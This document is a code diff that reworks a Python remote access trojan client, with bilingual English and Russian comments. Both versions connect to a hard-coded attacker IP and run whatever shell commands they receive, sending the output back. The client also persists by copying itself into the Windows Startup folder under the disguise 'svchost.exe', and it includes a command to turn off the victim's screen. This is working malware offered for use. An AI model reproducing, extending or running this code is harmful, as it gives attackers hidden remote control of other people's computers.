@@ -1,117 +1,82 @@
-import os
 import socket
-import subprocess
-from time import sleep
+import os
+import time
 import sys
-import tqdm
-SEPARATOR = "<SEPARATOR>"
-# Attacker IP / Айпи атакующего
-HOST = '192.168.1.47'
-# Port to connect / Порт на который клиент будет подключатся
-PORT = 10042
 
-s = socket.socket()
-
-
-# Only for Windows / Только для Windows
-def auto_run():
-    # Name of the compiled file / Имя скомпилированного файла
-    filename = "svcnost.exe"
-    # Windows username/ Имя пользователя Windows
-    username = os.getlogin()
-    # Path to startup folder / Путь к папке с автозагрузкой
-    startup = (r'C:/Users/' + username + r'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
-
-    # Check if file already exist / Проверка существует ли файл
-    if os.path.exists(str(startup + r'svchost.exe')) == True:
-        # Sending message / Отправляем сообщение
-        s.send(bytes("\nRAT already at startup folder\n", encoding="utf-8", errors="ignore"))
-    else:
-        os.system("copy " + filename + " " + '"' + startup + '"' + r'svchost.exe')
-        # Sending message / Отправляем сообщение
-        s.send(bytes("\nRAT added at startup folder\n", encoding="utf-8", errors="ignore"))
-
-
-# Connect function / Функция подключения
-def main():
+while True:
     try:
-        s.connect((HOST, PORT))
-        session()
+        sock = socket.socket()
+        sock.connect(("192.168.1.47", 9696))
+        while True:
+            try:
+                comm = sock.recv(1024).decode()
+                res_bytes = os.popen(comm)
+                result = res_bytes.read()
+                if comm == 'downcli':
+                    exit()
+                elif comm == 'screenoff':
+                    if sys.platform.startswith('linux'):
+                        os.system("xset dpms force off")
+
+                    elif sys.platform.startswith('win'):
+                        import win32gui
+                        import win32con
+                        from os import getpid, system
+                        from threading import Timer
+
+
+                        def force_exit():
+                            pid = getpid()
+                            system('taskkill /pid %s /f' % pid)
+                        t = Timer(1, force_exit)
+                        t.start()
+                        SC_MONITORPOWER = 0xF170
+                        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, SC_MONITORPOWER, 2)
+                        t.cancel()
+                    sock.send("Screen offed...".encode())
+                elif comm[:2] == "cd":
+                    try:
+                        # Send command arguments to os.chdir / Отправка аргументов команды в os.chdir
+                        os.chdir(comm[3:])
+                        pwd = os.getcwd()
+                        sock.send(bytes(pwd, encoding="utf-8", errors="ignore"))
+                    except Exception as ex:
+                        sock.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
+
+                # PWD
+
+                elif comm == "pwd":
+                    try:
+                        # Variable with current directory / Переменная с текущей директорией
+                        pwd = os.getcwd()
+                        sock.send(bytes(pwd, encoding="utf-8", errors="ignore"))
+                    except Exception as ex:
+                        sock.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
+                elif comm == 'autorun':
+                        # Name of the compiled file / Имя скомпилированного файла
+                        filename = "svcnost.exe"
+                        # Windows username/ Имя пользователя Windows
+                        username = os.getlogin()
+                        # Path to startup folder / Путь к папке с автозагрузкой
+                        startup = (r'C:/Users/' + username + r'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
+
+                        # Check if file already exist / Проверка существует ли файл
+                        if os.path.exists(str(startup + r'svchost.exe')) == True:
+                            # Sending message / Отправляем сообщение
+                            sock.send(bytes("\nRAT already at startup folder\n", encoding="utf-8", errors="ignore"))
+                        else:
+                            os.system("copy " + filename + " " + '"' + startup + '"' + r'svchost.exe')
+                            # Sending message / Отправляем сообщение
+                            sock.send(bytes("\nRAT added at startup folder\n", encoding="utf-8", errors="ignore"))
+                else:
+                    if len(result) == 0:
+                        sock.send("No result or error".encode())
+                        continue
+                    else:
+                        sock.send(result.encode())
+                        continue
+            except:
+                break
     except:
-        sleep(5)
-        s.connect((HOST, PORT))
-
-
-def screenoff():
-    if sys.platform.startswith('linux'):
-        os.system("xset dpms force off")
-
-    elif sys.platform.startswith('win'):
-        import win32gui
-        import win32con
-        from os import getpid, system
-        from threading import Timer
-
-        def force_exit():
-            pid = getpid()
-            system('taskkill /pid %s /f' % pid)
-
-        t = Timer(1, force_exit)
-        t.start()
-        SC_MONITORPOWER = 0xF170
-        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, SC_MONITORPOWER, 2)
-        t.cancel()
-    s.send("Screen offed...".encode())
-    session()
-# Command processor / Обработчик команд
-def session():
-    while True:
-        data = s.recv(1024)
-        cmd = str(data, encoding="utf-8", errors="ignore")
-
-        if cmd == 'shutdownrat':
-            s.close()
-            exit(0)
-
-        # AUTORUN (Only for Windows / Только для Windows)
-        elif cmd == "autorun":
-            auto_run()
-
-        elif cmd == "screenoff":
-            screenoff()
-        # CD
-        elif cmd[:2] == "cd":
-            try:
-                # Send command arguments to os.chdir / Отправка аргументов команды в os.chdir
-                os.chdir(data[3:])
-                pwd = os.getcwd()
-                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
-            except Exception as ex:
-                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
-
-        # PWD
-
-        elif cmd == "pwd":
-            try:
-                # Variable with current directory / Переменная с текущей директорией
-                pwd = os.getcwd()
-                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
-            except Exception as ex:
-                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
-
-        else:
-            command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            # Variable with subprocess output / Переменная с ответом от subprocess
-            output_byte = command.stdout.read() + command.stderr.read()
-            # Convert output_byte to string / Конвертируем output_byte в строку
-            output_str = str(output_byte, "utf-8", errors="ignore")
-            # Sending output_str to server / Отправляем output_str на сервер
-            if len(output_str) == 0:
-                s.send(" ".encode())
-            else:
-                s.send(bytes(output_str, encoding="utf-8", errors="ignore"))
-
-
-if __name__ == '__main__':
-    main()
+        time.sleep(5)
+        continue
